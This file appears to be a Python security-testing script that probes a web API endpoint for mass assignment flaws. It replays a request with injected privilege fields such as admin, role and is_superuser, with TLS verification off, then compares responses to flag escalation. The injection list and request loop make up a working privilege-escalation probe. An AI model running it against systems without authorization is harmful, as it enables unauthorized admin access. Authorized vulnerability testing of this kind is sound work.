#!/usr/bin/env python3
"""
Reference example: Mass Assignment / Object Injection Testing

This file is a reference implementation illustrating how to test for
mass assignment vulnerabilities where additional parameters can be
injected to escalate privileges.

Usage:
    python mass_assignment.py --url "http://target.com/api/user/register" \\
        --method POST --data '{"username":"test","password":"test123"}' \\
        --output results.json
"""
import argparse
import json
import hashlib
import requests
from typing import Dict, List, Any, Optional
from difflib import SequenceMatcher

# Disable SSL warnings for testing
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Response size limit
MAX_RESPONSE_SIZE = 8 * 1024

# Mass assignment parameters to inject (privilege escalation)
PRIVILEGE_PARAMS = [
    # Admin flags
    {"admin": True},
    {"admin": 1},
    {"isAdmin": True},
    {"is_admin": True},

    # Role parameters
    {"role": "admin"},
    {"role": "administrator"},
    {"userRole": "admin"},
    {"user_role": "admin"},

    # Permission parameters
    {"privilege": "admin"},
    {"access_level": "admin"},
    {"permissions": ["admin", "write", "delete"]},

    # Account type
    {"type": "admin"},
    {"accountType": "admin"},
    {"account_type": "admin"},

    # Boolean flags
    {"verified": True},
    {"is_verified": True},
    {"approved": True},
    {"active": True},
    {"enabled": True},

    # Superuser flags
    {"superuser": True},
    {"is_superuser": True},
    {"staff": True},
    {"is_staff": True},

    # Premium flags
    {"premium": True},
    {"is_premium": True},
    {"vip": True},

    # ID manipulation
    {"id": 1},
    {"user_id": 1},
    {"owner_id": 1},

    # Group
    {"group": "admin"},
    {"group_id": 1},
]


def truncate_and_hash(response_text: str) -> tuple:
    """Truncate response and compute hash"""
    full_hash = hashlib.sha256(response_text.encode()).hexdigest()
    truncated = response_text[:MAX_RESPONSE_SIZE]
    is_truncated = len(response_text) > MAX_RESPONSE_SIZE

    return truncated, f"sha256:{full_hash}", is_truncated, len(response_text)


def similar(a: str, b: str) -> float:
    """Calculate similarity ratio between two strings"""
    return SequenceMatcher(None, a, b).ratio()


def redact_sensitive_fields(data: Any) -> Any:
    """Redact sensitive fields from response data"""
    sensitive_keys = [
        'password', 'passwd', 'secret', 'token', 'api_key',
        'access_token', 'refresh_token', 'private_key', 'ssn',
        'credit_card', 'card_number', 'cvv'
    ]

    if isinstance(data, dict):
        redacted = {}
        for key, value in data.items():
            if any(s in key.lower() for s in sensitive_keys):
                redacted[key] = "[REDACTED]"
            elif isinstance(value, (dict, list)):
                redacted[key] = redact_sensitive_fields(value)
            else:
                redacted[key] = value
        return redacted
    elif isinstance(data, list):
        return [redact_sensitive_fields(item) for item in data]
    return data


def find_in_nested(obj: Any, key: str) -> Any:
    """Recursively find a key in nested dict/list structures"""
    if isinstance(obj, dict):
        if key in obj:
            return obj[key]
        for v in obj.values():
            found = find_in_nested(v, key)
            if found is not None:
                return found
    elif isinstance(obj, list):
        for item in obj:
            found = find_in_nested(item, key)
            if found is not None:
                return found
    return None


def detect_privilege_escalation(
    baseline_resp: requests.Response,
    test_resp: requests.Response,
    injected_params: Dict[str, Any]
) -> Dict[str, Any]:
    """Analyze if privilege escalation occurred"""

    result = {
        "escalation_detected": False,
        "indicators": [],
        "severity": None
    }

    # Check status code change
    if baseline_resp.status_code != test_resp.status_code:
        result["indicators"].append(f"Status code changed: {baseline_resp.status_code} -> {test_resp.status_code}")

    # Parse JSON responses if possible
    try:
        baseline_json = baseline_resp.json()
        test_json = test_resp.json()

        # Check if injected parameters appear in response (including nested)
        for param, value in injected_params.items():
            # Check both root level and nested
            test_value = test_json.get(param) if isinstance(test_json, dict) else None
            if test_value is None:
                test_value = find_in_nested(test_json, param)

            baseline_value = baseline_json.get(param) if isinstance(baseline_json, dict) else None
            if baseline_value is None:
                baseline_value = find_in_nested(baseline_json, param)

            if test_value is not None:
                # Check if value changed to our injected value
                if test_value == value or str(test_value).lower() == str(value).lower():
                    result["escalation_detected"] = True
                    result["indicators"].append(
                        f"Injected parameter '{param}' reflected in response with value '{test_value}'"
                    )
                    result["severity"] = "HIGH"
                elif baseline_value != test_value:
                    result["indicators"].append(
                        f"Parameter '{param}' changed: {baseline_value} -> {test_value}"
                    )

        # Check for role/admin related fields in response (including nested)
        privilege_indicators = ['admin', 'role', 'privilege', 'permission', 'is_admin', 'superuser']
        for field in privilege_indicators:
            test_value = find_in_nested(test_json, field)
            baseline_value = find_in_nested(baseline_json, field)

            if test_value is not None and baseline_value is None:
                result["indicators"].append(f"New privilege field '{field}' appeared in response")
            elif test_value is not None and baseline_value is not None:
                if test_value != baseline_value:
                    result["indicators"].append(
                        f"Privilege field '{field}' changed: {baseline_value} -> {test_value}"
                    )
                    result["escalation_detected"] = True
                    result["severity"] = "HIGH"

    except (json.JSONDecodeError, ValueError):
        # Not JSON, compare text similarity
        similarity = similar(baseline_resp.text, test_resp.text)
        if similarity < 0.9:
            result["indicators"].append(f"Response body significantly different (similarity: {similarity:.2%})")

    if not result["severity"] and result["indicators"]:
        result["severity"] = "MEDIUM"

    return result


def test_mass_assignment(
    url: str,
    method: str = "POST",
    data: Optional[str] = None,
    cookie: Optional[str] = None,
    header: Optional[str] = None,
    timeout: int = 10
) -> Dict[str, Any]:
    """
    Main mass assignment testing function

    Args:
        url: Target URL (user registration, profile update, etc.)
        method: HTTP method
        data: Base request body (JSON)
        cookie: Session cookie
        header: Custom header
        timeout: Request timeout

    Returns:
        Dictionary with all test results
    """
    session = requests.Session()
    session.headers["Content-Type"] = "application/json"

    # Set cookies if provided
    if cookie:
        for c in cookie.split(";"):
            c = c.strip()
            if "=" in c:
                name, value = c.split("=", 1)
                session.cookies.set(name.strip(), value.strip())

    # Set custom headers if provided
    if header:
        if ":" in header:
            name, value = header.split(":", 1)
            session.headers[name.strip()] = value.strip()

    # Parse base data
    base_data = {}
    if data:
        try:
            base_data = json.loads(data)
        except json.JSONDecodeError:
            return {
                "status": "UNVALIDATED",
                "reason": "Invalid JSON data provided",
                "baseline": None,
                "tests": []
            }

    # Get baseline response
    try:
        baseline_resp = session.request(method, url, json=base_data,
                                        timeout=timeout, verify=False)
        baseline_snippet, baseline_hash, baseline_truncated, baseline_size = truncate_and_hash(baseline_resp.text)

        # Redact baseline response
        try:
            baseline_json = baseline_resp.json()
            baseline_redacted = redact_sensitive_fields(baseline_json)
            baseline_snippet = json.dumps(baseline_redacted)[:500]
        except:
            pass

        baseline = {
            "url": url,
            "method": method,
            "data": redact_sensitive_fields(base_data),
            "status_code": baseline_resp.status_code,
            "response_snippet": baseline_snippet,
            "response_hash": baseline_hash,
            "truncated": baseline_truncated,
            "original_size_bytes": baseline_size
        }
    except requests.RequestException as e:
        return {
            "status": "UNVALIDATED",
            "reason": f"Baseline request failed: {str(e)}",
            "baseline": None,
            "tests": []
        }

    # Test each privilege parameter
    tests = []
    for params in PRIVILEGE_PARAMS:
        # Merge base data with injected params
        test_data = {**base_data, **params}

        try:
            test_resp = session.request(method, url, json=test_data,
                                       timeout=timeout, verify=False)
            test_snippet, test_hash, test_truncated, test_size = truncate_and_hash(test_resp.text)

            # Redact test response
            try:
                test_json = test_resp.json()
                test_redacted = redact_sensitive_fields(test_json)
                test_snippet = json.dumps(test_redacted)[:500]
            except:
                pass

            # Analyze for privilege escalation
            analysis = detect_privilege_escalation(baseline_resp, test_resp, params)

            result = {
                "injected_params": params,
                "url": url,
                "method": method,
                "status_code": test_resp.status_code,
                "response_snippet": test_snippet,
                "response_hash": test_hash,
                "truncated": test_truncated,
                "original_size_bytes": test_size,
                **analysis
            }
            tests.append(result)

        except requests.RequestException as e:
            tests.append({
                "injected_params": params,
                "url": url,
                "method": method,
                "error": str(e),
                "escalation_detected": False
            })

    # Find successful escalations
    escalations = [t for t in tests if t.get("escalation_detected")]

    # Determine status
    if escalations:
        high_sev = [e for e in escalations if e.get("severity") == "HIGH"]
        if high_sev:
            status = "VALIDATED"
            evidence = f"CRITICAL: Mass assignment vulnerability - {len(high_sev)} privilege escalation(s) detected"
        else:
            status = "PARTIAL"
            evidence = f"Potential mass assignment - {len(escalations)} suspicious response change(s)"
    else:
        status = "FALSE_POSITIVE"
        evidence = "No mass assignment vulnerabilities detected"

    return {
        "status": status,
        "baseline": baseline,
        "tests": tests,
        "escalations": escalations,
        "evidence": evidence
    }


def main():
    parser = argparse.ArgumentParser(description="Mass Assignment Testing Script")
    parser.add_argument("--url", required=True, help="Target URL (registration/update endpoint)")
    parser.add_argument("--method", default="POST", help="HTTP method (default: POST)")
    parser.add_argument("--data", "-d", help="Base request body (JSON)")
    parser.add_argument("--cookie", help="Session cookie (name=value; name2=value2)")
    parser.add_argument("--header", "-H", help="Custom header (Header-Name: value)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (seconds)")
    parser.add_argument("--output", "-o", required=True, help="Output JSON file")

    args = parser.parse_args()

    print(f"[*] Testing mass assignment on: {args.url}")
    print(f"[*] Method: {args.method}")

    result = test_mass_assignment(
        url=args.url,
        method=args.method,
        data=args.data,
        cookie=args.cookie,
        header=args.header,
        timeout=args.timeout
    )

    with open(args.output, 'w') as f:
        json.dump(result, f, indent=2)

    print(f"[*] Status: {result['status']}")
    print(f"[*] Evidence: {result.get('evidence', 'N/A')}")

    if result.get('escalations'):
        print(f"[!] Found {len(result['escalations'])} privilege escalation(s):")
        for esc in result['escalations'][:5]:  # Show first 5
            print(f"    - Injected: {esc.get('injected_params')}")
            print(f"      Severity: {esc.get('severity')}")
            for indicator in esc.get('indicators', [])[:3]:
                print(f"      -> {indicator}")

    print(f"[*] Results saved to: {args.output}")

    return 0 if result['status'] not in ['UNVALIDATED'] else 1


if __name__ == "__main__":
    exit(main())
